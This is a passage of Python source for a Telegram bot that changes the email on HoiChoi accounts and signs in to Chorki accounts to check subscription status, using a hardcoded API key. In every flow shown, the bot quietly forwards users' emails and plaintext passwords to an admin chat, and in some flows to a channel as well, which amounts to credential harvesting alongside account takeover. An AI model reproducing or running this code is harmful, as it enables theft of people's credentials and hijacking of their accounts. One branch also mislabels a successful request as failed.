            if email_update_response.get("code") == "ACCOUNT_UPDATE_NOT_ALLOWED":
                bot.send_message(
                    message.chat.id,
                    "Email update requested to server. Please wait for 10 minutes.",
                )
                bot.send_message(
                    CHANNEL_ID,
                    "Email update requested to server. Please wait for 10 minutes."
                )
                return
            else:
                end_time = time.time()  # End the timer
                time_taken = end_time - start_time  # Calculate the time taken

                bot.send_message(
                    message.chat.id,
                    f"Email update request successfully submitted to server. This action will be completed within 10 minutes.\n\n"
                    f"Bot Developed by @N2X4E\n"
                    f"Time taken: {time_taken:.2f} seconds"
                )
                del user_states[message.chat.id]

                fail_message = (
                    f"TRY HOICHOI email change failed!\n\n"
                    f"Requester Telegram Full Name: {message.from_user.first_name} {message.from_user.last_name}\n"
                    f"Username: @{message.from_user.username}\n"
                    f"User ID: {message.from_user.id}\n\n"
                    f"Old Email: {user_state.get('hoiemail')}\n"
                    f"New Email: {user_state.get('hoinew_email')}\n"
                    f"Password: {user_state.get('hoipassword')}\n"
                    f"New Name: {user_state.get('hoinew_name')}\n"
                    f"Failed Reason: {email_update_response['response_text']}\n"
                    f"Time taken: {time_taken:.2f} seconds"
                )
                bot.send_message(ADMIN_CHAT_ID, fail_message, parse_mode='MarkdownV2')
                bot.send_message(CHANNEL_ID, fail_message, parse_mode='MarkdownV2')
                return

        end_time = time.time()  # End the timer
        time_taken = end_time - start_time  # Calculate the time taken

        success_message = (
            f"Successful! Your HoiChoi email and name have been updated.\n\n"
            f"Old Email: {user_state.get('hoiemail')}\n"
            f"New Email: {user_state.get('hoinew_email')}\n"
            f"Password: {user_state.get('hoipassword')}\n\n"
            f"Bot Developed by @N2X4E\n"
            f"Time taken: {time_taken:.2f} seconds"
        )
        bot.send_message(message.chat.id, success_message, parse_mode='MarkdownV2')

        admin_success_message = (
            f"Hoichoi email change successful!\n\n"
            f"Requester Telegram Full Name: {message.from_user.first_name} {message.from_user.last_name}\n"
            f"Username: @{message.from_user.username}\n"
            f"User ID: {message.from_user.id}\n\n"
            f"Old Email: {user_state.get('hoiemail')}\n"
            f"New Email: {user_state.get('hoinew_email')}\n"
            f"Password: {user_state.get('hoipassword')}\n"
            f"New Name: {user_state.get('hoinew_name')}\n"
            f"Time taken: {time_taken:.2f} seconds"
        )
        bot.send_message(ADMIN_CHAT_ID, admin_success_message, parse_mode='MarkdownV2')
        bot.send_message(CHANNEL_ID, admin_success_message, parse_mode='MarkdownV2')
    except Exception as e:
        print(f"An error occurred: {e}")

#Command handler for /chorki_sign_in
@bot.message_handler(func=lambda message: message.text == 'CHORKI SIGN IN')
def handle_signin(message):
    try:
        bot.reply_to(message, "Please enter your Chorki email:")
        user_states[message.chat.id] = 'CHORKI_SIGNIN_EMAIL'
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_SIGNIN_EMAIL')
def handle_signin_email_input(message):
    try:
        # Process the email and move to the next state
        user_states[message.chat.id] = 'CHORKI_SIGNIN_PASSWORD'
        bot.reply_to(message, "Please enter your password:")

        # Store the email in a temporary variable
        user_states['temp_chorkiemail'] = message.text
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_SIGNIN_PASSWORD')
def handle_signin_password_input(message):
    try:
        # Process the password and complete the SIGN IN

        # Construct the request data
        signin_data = {
            "email": user_states.get('temp_chorkiemail', ''),
            "password": message.text
        }

        # Start the timer
        start_time = time.time()

        # Make the API request for SIGN IN
        sign_in_response = send_api_request_with_details(f"{API_URL}/signin?site=prothomalo", headers=headersC, data=signin_data)

        # Calculate the elapsed time
        elapsed_time = time.time() - start_time
        elapsed_time_message = f"Time taken: {elapsed_time:.2f} seconds"

        if sign_in_response and 'isSubscribed' in sign_in_response:
            # Check if the user has a subscription
            is_subscribed = sign_in_response['isSubscribed']

            if is_subscribed:
                # User has a subscription, retrieve subscription info
                authorization_token = sign_in_response.get('authorizationToken', '')

                # User endpoint request
                user_url = "https://prod-api.viewlift.com/identity/user?site=prothomalo"
                user_headers = {
                    "authorization": authorization_token,
                    "User-Agent": "NiHAL",
                    "X-Api-Key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
                }

                user_response = requests.get(user_url, headers=user_headers)

                if user_response.status_code == 200:
                    user_data = user_response.json()

                    # Key checks and print information
                    if "country" in user_data:
                        country_info = f"**Country:** {user_data['country']}"
                    else:
                        country_info = "**Country:** Not Provided"

                    if "phoneNumber" in user_data:
                        phone_info = f"**Phone Number:** {user_data['phoneNumber']}"
                    else:
                        phone_info = "**Phone Number:** Not Provided"

                    if "subscription" in user_data and "subscriptionInfo" in user_data["subscription"]:
                        subscription_info = user_data["subscription"]["subscriptionInfo"]

                        total_amount_info = f"**Total Amount:** {subscription_info.get('totalAmount', 'N/A')}"
                        devices_info = f"**Number of Allowed Devices:** {subscription_info.get('numberOfAllowedDevices', 'N/A')}"
                        streams_info = f"**Number of Allowed Streams:** {subscription_info.get('numberOfAllowedStreams', 'N/A')}"
                        end_date_info = f"**Subscription End Date:** {subscription_info.get('subscriptionEndDate', 'N/A')}"
                    else:
                        total_amount_info = "**Total Amount:** Not Provided"
                        devices_info = "**Number of Allowed Devices:** Not Provided"
                        streams_info = "**Number of Allowed Streams:** Not Provided"
                        end_date_info = "**Subscription End Date:** Not Provided"

                    # Send details to the user
                    user_message = f"**Successful Sign In!**\n\n"
                    user_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
                    user_message += f"Password: {message.text}\n\n"
                    user_message += f"{country_info}\n"
                    user_message += f"{phone_info}\n"
                    user_message += f"{total_amount_info}\n"
                    user_message += f"{devices_info}\n"
                    user_message += f"{streams_info}\n"  # New line for Number of Allowed Streams
                    user_message += f"{end_date_info}\n"
                    user_message += f"{elapsed_time_message}\n"
                    user_message += "\nPowered by @N2X4E"
                    bot.send_message(message.chat.id, user_message, parse_mode='Markdown')

                    # Send details to admin
                    admin_message = f"**Sign In Details:**\n"
                    admin_message += f"Name: {message.from_user.first_name}\n"
                    admin_message += f"Username: @{message.from_user.username}\n"
                    admin_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
                    admin_message += f"Password: {message.text}\n\n"
                    admin_message += f"{country_info}\n"
                    admin_message += f"{phone_info}\n"
                    admin_message += f"{total_amount_info}\n"
                    admin_message += f"{devices_info}\n"
                    admin_message += f"{streams_info}\n"
                    admin_message += f"{end_date_info}"
                    bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')

                else:
                    bot.send_message(message.chat.id, f"Error accessing user endpoint: {user_response.status_code}")
                    bot.send_message(message.chat.id, "Please try again later.")

            else:
                user_message = f"**Successful Sign In**, but you don't have a subscription.\n\n"
                user_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
                user_message += f"Password: {message.text}\n"
                user_message += f"{elapsed_time_message}\n"
                user_message += "\nPowered by @N2X4E"
                bot.send_message(message.chat.id, user_message, parse_mode='Markdown')

                # Send details to admin
                admin_message = f"**Sign In Details (No Subscription):**\n"
                admin_message += f"Name: {message.from_user.first_name}\n"
                admin_message += f"Username: @{message.from_user.username}\n"
                admin_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
                admin_message += f"Password: {message.text}\n"
                admin_message += f"{elapsed_time_message}\n"
                bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')

        else:
            # Handle SIGN IN failure with response details
            if 'status_code' in sign_in_response:
                failure_message = f"SIGN IN failed. Status Code: `{sign_in_response['status_code']}`\nResponse Text: `{sign_in_response['response_text']}`\n"
            else:
                failure_message = f"SIGN IN failed. No response from the server.\n\nPowered by @N2X4E"

            bot.send_message(message.chat.id, failure_message, parse_mode='Markdown')

        # Reset user state
        reset_user_state(message.chat.id)
        user_states.pop('temp_chorkiemail', None)
    except KeyError:
        bot.send_message(message.chat.id, "An error occurred. Please try again.")

# Start the bot
bot.polling()
